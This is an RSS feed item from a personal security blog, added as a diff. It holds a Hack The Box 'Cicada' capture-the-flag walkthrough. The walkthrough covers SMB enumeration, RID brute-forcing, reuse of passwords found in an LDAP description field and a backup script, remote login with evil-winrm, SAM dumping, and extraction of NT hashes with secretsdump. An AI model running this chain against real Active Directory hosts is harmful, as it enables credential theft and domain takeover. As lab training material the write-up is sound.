@@ -1,0 +1,1435 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>Posts on v3l1d&#39;s Blog</title>
+        <link>/posts/</link>
+        <description>Recent content in Posts on v3l1d&#39;s Blog</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en-us</language>
+        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
+        <lastBuildDate>Mon, 04 Nov 2024 00:00:00 +0000</lastBuildDate>
+        <atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>HTB: Cicada</title>
+            <link>/posts/cicada/</link>
+            <pubDate>Mon, 04 Nov 2024 00:00:00 +0000</pubDate>
+            
+            <guid>/posts/cicada/</guid>
+            <description>Nmap Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-02 17:25 EDT Nmap scan report for 10.10.11.35 Host is up (0.050s latency). Not shown: 989 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-11-03 04:25:56Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=CICADA-DC.</description>
+            <content type="html"><![CDATA[<p><img src="attachment/3e65122396982448c350b64016a51190.jpg" alt=""></p>
+<h3 id="nmap">Nmap</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-11-02 17:25 EDT
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.35
+Host is up <span style="color:#f92672">(</span>0.050s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">989</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2024-11-03 04:25:56Z<span style="color:#f92672">)</span>
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: cicada.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>CICADA-DC.cicada.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb
+| Not valid before: 2024-08-22T20:24:16
+|_Not valid after:  2025-08-22T20:24:16
+|_ssl-date: TLS randomness does not represent time
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: cicada.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>CICADA-DC.cicada.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb
+| Not valid before: 2024-08-22T20:24:16
+|_Not valid after:  2025-08-22T20:24:16
+|_ssl-date: TLS randomness does not represent time
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: cicada.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>CICADA-DC.cicada.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb
+| Not valid before: 2024-08-22T20:24:16
+|_Not valid after:  2025-08-22T20:24:16
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: cicada.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>CICADA-DC.cicada.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb
+| Not valid before: 2024-08-22T20:24:16
+|_Not valid after:  2025-08-22T20:24:16
+|_ssl-date: TLS randomness does not represent time
+Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
+Device type: general purpose
+Running <span style="color:#f92672">(</span>JUST GUESSING<span style="color:#f92672">)</span>: Microsoft Windows <span style="color:#ae81ff">2022</span> <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>
+Aggressive OS guesses: Microsoft Windows Server <span style="color:#ae81ff">2022</span> <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>
+No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
+Network Distance: <span style="color:#ae81ff">2</span> hops
+Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2024-11-03T04:26:41
+|_  start_date: N/A
+|_clock-skew: 7h00m20s
+
+TRACEROUTE <span style="color:#f92672">(</span>using port 139/tcp<span style="color:#f92672">)</span>
+HOP RTT      ADDRESS
+<span style="color:#ae81ff">1</span>   45.80 ms 10.10.14.1
+<span style="color:#ae81ff">2</span>   46.19 ms 10.10.11.35
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 109.78 seconds
+
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB/Cicada<span style="color:#f92672">]</span>
+└─$ smbclient -L //10.10.11.35/ -N 
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        DEV             Disk      
+        HR              Disk      
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        SYSVOL          Disk      Logon server share 
+Reconnecting with SMB1 <span style="color:#66d9ef">for</span> workgroup listing.
+do_connect: Connection to 10.10.11.35 failed <span style="color:#f92672">(</span>Error 
+
+</code></pre></div><p>Tried anonymous login on some folders, found that HR is accessible</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB/Cicada<span style="color:#f92672">]</span>
+└─$ smbclient -N //10.10.11.35/HR 
+Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+smb: <span style="color:#ae81ff">\&gt;</span> dir
+  .                                   D        <span style="color:#ae81ff">0</span>  Thu Mar <span style="color:#ae81ff">14</span> 08:29:09 <span style="color:#ae81ff">2024</span>
+  ..                                  D        <span style="color:#ae81ff">0</span>  Thu Mar <span style="color:#ae81ff">14</span> 08:21:29 <span style="color:#ae81ff">2024</span>
+  Notice from HR.txt                  A     <span style="color:#ae81ff">1266</span>  Wed Aug <span style="color:#ae81ff">28</span> 13:31:48 <span style="color:#ae81ff">2024</span>
+
+                <span style="color:#ae81ff">4168447</span> blocks of size 4096. <span style="color:#ae81ff">57914</span> blocks available
+smb: <span style="color:#ae81ff">\&gt;</span> 
+
+┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB/Cicada<span style="color:#f92672">]</span>
+└─$ smbclient -N //10.10.11.35/HR 
+Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+smb: <span style="color:#ae81ff">\&gt;</span> get <span style="color:#e6db74">&#34;Notice from HR.txt&#34;</span>
+getting file <span style="color:#ae81ff">\N</span>otice from HR.txt of size <span style="color:#ae81ff">1266</span> as Notice from HR.txt <span style="color:#f92672">(</span>4.4 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 4.4 KiloBytes/sec<span style="color:#f92672">)</span>
+smb: <span style="color:#ae81ff">\&gt;</span> 
+
+</code></pre></div><p>Let&rsquo;s analyze this file:
+<img src="attachment/9e484ac257c8f23b6e9d6f3bbc7fc9b1.png" alt="">
+We have a default passowrd, but don&rsquo;t know the related username to use it with, so let&rsquo;s try to enumerate the usernames:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB/Cicada<span style="color:#f92672">]</span>
+└─$ crackmapexec smb cicada.htb -u guest -p <span style="color:#e6db74">&#39;&#39;</span> --rid-brute
+SMB         cicada.htb      <span style="color:#ae81ff">445</span>    CICADA-DC        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:CICADA-DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:cicada.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
+SMB         cicada.htb      <span style="color:#ae81ff">445</span>    CICADA-DC        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> cicada.htb<span style="color:#ae81ff">\g</span>uest: 
+SMB         cicada.htb      <span style="color:#ae81ff">445</span>    CICADA-DC        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Brute forcing RIDs
+SMB         cicada.htb      <span style="color:#ae81ff">445</span>    CICADA-DC        498: CICADA<span style="color:#ae81ff">\E</span>nterprise Read-only Domain Controllers <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+SMB         cicada.htb      <span style="color:#ae81ff">445</span>    CICADA-DC        500: CICADA<span style="color:#ae81ff">\A</span>dministrator <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+SMB         cicada.htb      <span style="color:#ae81ff">445</span>    CICADA-DC        501: CICADA<span style="color:#ae81ff">\G</span>uest <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+SMB         cicada.htb      <span style="color:#ae81ff">445</span>    CICADA-DC        502: CICADA<span style="color:#ae81ff">\k</span>rbtgt <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+SMB         cicada.htb      <span style="color:#ae81ff">445</span>    CICADA-DC        512: CICADA<span style="color:#ae81ff">\D</span>omain Admins <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+SMB         cicada.htb      <span style="color:#ae81ff">445</span>    CICADA-DC        513: CICADA<span style="color:#ae81ff">\D</span>omain Users <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+SMB         cicada.htb      <span style="color:#ae81ff">445</span>    CICADA-DC        514: CICADA<span style="color:#ae81ff">\D</span>omain Guests <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+SMB         cicada.htb      <span style="color:#ae81ff">445</span>    CICADA-DC        515: CICADA<span style="color:#ae81ff">\D</span>omain Computers <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+SMB         cicada.htb      <span style="color:#ae81ff">445</span>    CICADA-DC        516: CICADA<span style="color:#ae81ff">\D</span>omain Controllers <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+SMB         cicada.htb      <span style="color:#ae81ff">445</span>    CICADA-DC        517: CICADA<span style="color:#ae81ff">\C</span>ert Publishers <span style="color:#f92672">(</span>SidTypeAlias<span style="color:#f92672">)</span>
+SMB         cicada.htb      <span style="color:#ae81ff">445</span>    CICADA-DC        518: CICADA<span style="color:#ae81ff">\S</span>chema Admins <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+SMB         cicada.htb      <span style="color:#ae81ff">445</span>    CICADA-DC        519: CICADA<span style="color:#ae81ff">\E</span>nterprise Admins <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+SMB         cicada.htb      <span style="color:#ae81ff">445</span>    CICADA-DC        520: CICADA<span style="color:#ae81ff">\G</span>roup Policy Creator Owners <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+SMB         cicada.htb      <span style="color:#ae81ff">445</span>    CICADA-DC        521: CICADA<span style="color:#ae81ff">\R</span>ead-only Domain Controllers <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+SMB         cicada.htb      <span style="color:#ae81ff">445</span>    CICADA-DC        522: CICADA<span style="color:#ae81ff">\C</span>loneable Domain Controllers <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+SMB         cicada.htb      <span style="color:#ae81ff">445</span>    CICADA-DC        525: CICADA<span style="color:#ae81ff">\P</span>rotected Users <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+SMB         cicada.htb      <span style="color:#ae81ff">445</span>    CICADA-DC        526: CICADA<span style="color:#ae81ff">\K</span>ey Admins <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+SMB         cicada.htb      <span style="color:#ae81ff">445</span>    CICADA-DC        527: CICADA<span style="color:#ae81ff">\E</span>nterprise Key Admins <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+SMB         cicada.htb      <span style="color:#ae81ff">445</span>    CICADA-DC        553: CICADA<span style="color:#ae81ff">\R</span>AS and IAS Servers <span style="color:#f92672">(</span>SidTypeAlias<span style="color:#f92672">)</span>
+SMB         cicada.htb      <span style="color:#ae81ff">445</span>    CICADA-DC        571: CICADA<span style="color:#ae81ff">\A</span>llowed RODC Password Replication Group <span style="color:#f92672">(</span>SidTypeAlias<span style="color:#f92672">)</span>
+SMB         cicada.htb      <span style="color:#ae81ff">445</span>    CICADA-DC        572: CICADA<span style="color:#ae81ff">\D</span>enied RODC Password Replication Group <span style="color:#f92672">(</span>SidTypeAlias<span style="color:#f92672">)</span>
+SMB         cicada.htb      <span style="color:#ae81ff">445</span>    CICADA-DC        1000: CICADA<span style="color:#ae81ff">\C</span>ICADA-DC$ <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+SMB         cicada.htb      <span style="color:#ae81ff">445</span>    CICADA-DC        1101: CICADA<span style="color:#ae81ff">\D</span>nsAdmins <span style="color:#f92672">(</span>SidTypeAlias<span style="color:#f92672">)</span>
+SMB         cicada.htb      <span style="color:#ae81ff">445</span>    CICADA-DC        1102: CICADA<span style="color:#ae81ff">\D</span>nsUpdateProxy <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+SMB         cicada.htb      <span style="color:#ae81ff">445</span>    CICADA-DC        1103: CICADA<span style="color:#ae81ff">\G</span>roups <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+SMB         cicada.htb      <span style="color:#ae81ff">445</span>    CICADA-DC        1104: CICADA<span style="color:#ae81ff">\j</span>ohn.smoulder <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+SMB         cicada.htb      <span style="color:#ae81ff">445</span>    CICADA-DC        1105: CICADA<span style="color:#ae81ff">\s</span>arah.dantelia <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+SMB         cicada.htb      <span style="color:#ae81ff">445</span>    CICADA-DC        1106: CICADA<span style="color:#ae81ff">\m</span>ichael.wrightson <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+SMB         cicada.htb      <span style="color:#ae81ff">445</span>    CICADA-DC        1108: CICADA<span style="color:#ae81ff">\d</span>avid.orelious <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+SMB         cicada.htb      <span style="color:#ae81ff">445</span>    CICADA-DC        1109: CICADA<span style="color:#ae81ff">\D</span>ev Support <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+SMB         cicada.htb      <span style="color:#ae81ff">445</span>    CICADA-DC        1601: CICADA<span style="color:#ae81ff">\e</span>mily.oscars <span style="color:#f92672">(</span>SidTypeUser
+</code></pre></div><p>Trying the usernames i found that the correct one was <strong>michael.wrightson</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">ldapsearch -x -H ldap://cicada.htb -D <span style="color:#e6db74">&#34;Cicada\\michael.wrightson&#34;</span> -w <span style="color:#e6db74">&#39;Cicada$M6Corpb*@Lp#nZp!8&#39;</span> -b <span style="color:#e6db74">&#34;DC=cicada,DC=htb&#34;</span> <span style="color:#e6db74">&#34;(objectClass=user)&#34;</span>
+</code></pre></div><ol>
+<li>
+<p><strong><code>ldapsearch</code></strong>: This is the command-line utility used to search an LDAP directory.</p>
+</li>
+<li>
+<p><strong><code>-x</code></strong>: This option tells <code>ldapsearch</code> to use simple authentication instead of SASL (Simple Authentication and Security Layer).</p>
+</li>
+<li>
+<p><strong><code>-H ldap://&lt;IP&gt;</code></strong>: This specifies the LDAP server to connect to. You should replace <code>&lt;IP&gt;</code> with the actual IP address or hostname of the LDAP server you want to query.</p>
+</li>
+<li>
+<p><strong><code>-D &quot;Cicada\\michael.wrightson&quot;</code></strong>: This is the bind DN (Distinguished Name) used for authentication. The username is specified as <code>Cicada\michael.wrightson</code>. The backslash (<code>\</code>) is escaped with another backslash in the command line.</p>
+</li>
+<li>
+<p><strong><code>-w '&lt;password&gt;'</code></strong>: This specifies the password for the user <code>Cicada\michael.wrightson</code>. In your case, the password is <code>Cicada$M6Corpb*@Lp#nZp!8</code>. Be cautious about including sensitive information like passwords in command-line operations, as they can be exposed in command history or process lists.</p>
+</li>
+<li>
+<p><strong><code>-b &quot;DC=cicada,DC=htb&quot;</code></strong>: This defines the base DN (Distinguished Name) from which the search begins. In this case, it specifies the domain components for the <code>cicada.htb</code> domain.</p>
+</li>
+<li>
+<p><strong><code>&quot;(objectClass=user)&quot;</code></strong>: This is the search filter. It specifies that the command should return entries that are of the object class <code>user</code>. This is commonly used to find user accounts in an Active Directory environment.</p>
+</li>
+</ol>
+<p>Once got the output i saved it in a file and analyzed it:</p>
+<p><img src="attachment/61ba87fd9a0d7d79a09f4f44c942deb3.png" alt=""></p>
+<p>There&rsquo;s a password in description field for David Orelius:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB/Cicada<span style="color:#f92672">]</span>
+└─$ smbclient //cicada.htb/DEV -U david.orelious
+Password <span style="color:#66d9ef">for</span> <span style="color:#f92672">[</span>WORKGROUP<span style="color:#ae81ff">\d</span>avid.orelious<span style="color:#f92672">]</span>:aRt$Lp<span style="color:#75715e">#7t*VQ!3</span>
+smb: <span style="color:#ae81ff">\&gt;</span> ls
+  .                                   D        <span style="color:#ae81ff">0</span>  Thu Mar <span style="color:#ae81ff">14</span> 08:31:39 <span style="color:#ae81ff">2024</span>
+  ..                                  D        <span style="color:#ae81ff">0</span>  Thu Mar <span style="color:#ae81ff">14</span> 08:21:29 <span style="color:#ae81ff">2024</span>
+  Backup_script.ps1                   A      <span style="color:#ae81ff">601</span>  Wed Aug <span style="color:#ae81ff">28</span> 13:28:22 <span style="color:#ae81ff">2024</span>
+
+                <span style="color:#ae81ff">4168447</span> blocks of size 4096. <span style="color:#ae81ff">49639</span> blocks available
+smb: <span style="color:#ae81ff">\&gt;</span> get Backup_script.ps1 
+getting file <span style="color:#ae81ff">\B</span>ackup_script.ps1 of size <span style="color:#ae81ff">601</span> as Backup_script.ps1 <span style="color:#f92672">(</span>2.6 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 2.6 KiloBytes/sec<span style="color:#f92672">)</span>
+smb: <span style="color:#ae81ff">\&gt;</span> 
+</code></pre></div><p><img src="attachment/b7e32f9f0bfccdedfe327877af1673bf.png" alt=""></p>
+<p>Once got the file analyze its content:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB/Cicada<span style="color:#f92672">]</span>
+└─$ cat Backup_script.ps1  
+
+$sourceDirectory <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;C:\smb&#34;</span>
+$destinationDirectory <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;D:\Backup&#34;</span>
+
+$username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;emily.oscars&#34;</span>
+$password <span style="color:#f92672">=</span> ConvertTo-SecureString <span style="color:#e6db74">&#34;Q!3@Lp#M6b*7t*Vt&#34;</span> -AsPlainText -Force
+$credentials <span style="color:#f92672">=</span> New-Object System.Management.Automation.PSCredential<span style="color:#f92672">(</span>$username, $password<span style="color:#f92672">)</span>
+$dateStamp <span style="color:#f92672">=</span> Get-Date -Format <span style="color:#e6db74">&#34;yyyyMMdd_HHmmss&#34;</span>
+$backupFileName <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;smb_backup_</span>$dateStamp<span style="color:#e6db74">.zip&#34;</span>
+$backupFilePath <span style="color:#f92672">=</span> Join-Path -Path $destinationDirectory -ChildPath $backupFileName
+Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
+Write-Host <span style="color:#e6db74">&#34;Backup completed successfully. Backup file saved to: </span>$backupFilePath<span style="color:#e6db74">&#34;</span>
+
+</code></pre></div><p>Found other credentials inside it, use them with smbclient to browse trough C$</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB/Cicada<span style="color:#f92672">]</span>
+└─$ smbclient  //cicada.htb/C$ -U CICADA<span style="color:#ae81ff">\\</span>emily.oscars 
+Password <span style="color:#66d9ef">for</span> <span style="color:#f92672">[</span>CICADA<span style="color:#ae81ff">\e</span>mily.oscars<span style="color:#f92672">]</span>:
+Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+smb: <span style="color:#ae81ff">\&gt;</span> ls
+  $Recycle.Bin                      DHS        <span style="color:#ae81ff">0</span>  Thu Mar <span style="color:#ae81ff">14</span> 09:24:03 <span style="color:#ae81ff">2024</span>
+  $WinREAgent                        DH        <span style="color:#ae81ff">0</span>  Mon Sep <span style="color:#ae81ff">23</span> 12:16:49 <span style="color:#ae81ff">2024</span>
+  Documents and Settings          DHSrn        <span style="color:#ae81ff">0</span>  Thu Mar <span style="color:#ae81ff">14</span> 15:40:47 <span style="color:#ae81ff">2024</span>
+  DumpStack.log.tmp                 AHS    <span style="color:#ae81ff">12288</span>  Sun Nov  <span style="color:#ae81ff">3</span> 12:18:49 <span style="color:#ae81ff">2024</span>
+  pagefile.sys                      AHS <span style="color:#ae81ff">2097360896</span>  Sun Nov  <span style="color:#ae81ff">3</span> 20:34:40 <span style="color:#ae81ff">2024</span>
+  PerfLogs                            D        <span style="color:#ae81ff">0</span>  Thu Aug <span style="color:#ae81ff">22</span> 14:45:54 <span style="color:#ae81ff">2024</span>
+  Program Files                      DR        <span style="color:#ae81ff">0</span>  Thu Aug <span style="color:#ae81ff">29</span> 15:32:50 <span style="color:#ae81ff">2024</span>
+  Program Files <span style="color:#f92672">(</span>x86<span style="color:#f92672">)</span>                 D        <span style="color:#ae81ff">0</span>  Sat May  <span style="color:#ae81ff">8</span> 05:40:21 <span style="color:#ae81ff">2021</span>
+  ProgramData                       DHn        <span style="color:#ae81ff">0</span>  Sun Nov  <span style="color:#ae81ff">3</span> 14:53:45 <span style="color:#ae81ff">2024</span>
+  Recovery                         DHSn        <span style="color:#ae81ff">0</span>  Thu Mar <span style="color:#ae81ff">14</span> 15:41:18 <span style="color:#ae81ff">2024</span>
+  Shares                              D        <span style="color:#ae81ff">0</span>  Thu Mar <span style="color:#ae81ff">14</span> 08:21:29 <span style="color:#ae81ff">2024</span>
+  System Volume Information         DHS        <span style="color:#ae81ff">0</span>  Thu Mar <span style="color:#ae81ff">14</span> 07:18:00 <span style="color:#ae81ff">2024</span>
+  Temp                                D        <span style="color:#ae81ff">0</span>  Sun Nov  <span style="color:#ae81ff">3</span> 15:26:00 <span style="color:#ae81ff">2024</span>
+  temporary                           D        <span style="color:#ae81ff">0</span>  Sun Nov  <span style="color:#ae81ff">3</span> 19:47:16 <span style="color:#ae81ff">2024</span>
+  Users                              DR        <span style="color:#ae81ff">0</span>  Mon Aug <span style="color:#ae81ff">26</span> 16:11:25 <span style="color:#ae81ff">2024</span>
+  Windows                             D        <span style="color:#ae81ff">0</span>  Sun Nov  <span style="color:#ae81ff">3</span> 21:19:09 <span style="color:#ae81ff">2024</span>
+
+                <span style="color:#ae81ff">4168447</span> blocks of size 4096. <span style="color:#ae81ff">49574</span> blocks available
+smb: <span style="color:#ae81ff">\&gt;</span> 
+
+</code></pre></div><p>Navigate to emily.oscars' Desktop folder and you&rsquo;ll find the user flag:</p>
+<p><img src="attachment/eb966126c503e2aac24c0c3b2378726a.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">userflag:b1a85553011c051272b8b9bbf05a7258
+</code></pre></div><p>Use <a href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a> to log in the system</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">evil-winrm -i cicada.htb -u emily.oscars -p <span style="color:#e6db74">&#39;Q!3@Lp#M6b*7t*Vt&#39;</span> -s /path/to/local/Winpeas.exe
+</code></pre></div><p><img src="attachment/9795d07b42e23b355bb6731828e14690.png" alt=""></p>
+<p><img src="attachment/c8d3469c66416e2e25100a64545dbb13.png" alt="">
+With crackmapexec we can dump the SAM database:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">crackmapexec smb cicada.htb -u CICADA<span style="color:#ae81ff">\\</span>emily.oscars -p <span style="color:#e6db74">&#39;Q!3@Lp#M6b*7t*Vt&#39;</span> --sam
+</code></pre></div><p>Reconnect in smbclient to get the dump, or do it trough evil-winrm shell from C:\Temp folder:
+<img src="attachment/3d74e3c68be67b7ca787d2d12f727770.png" alt="">
+Then on your local kali use secrets-dump to extract hashes and then psexec to login as administator using the NT hash:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB/Cicada<span style="color:#f92672">]</span>
+└─$ impacket-secretsdump -sam sam -system system LOCAL
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping local SAM hashes <span style="color:#f92672">(</span>uid:rid:lmhash:nthash<span style="color:#f92672">)</span>
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> SAM hashes extraction <span style="color:#66d9ef">for</span> user WDAGUtilityAccount failed. The account doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have hash information.
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Cleaning up... 
+
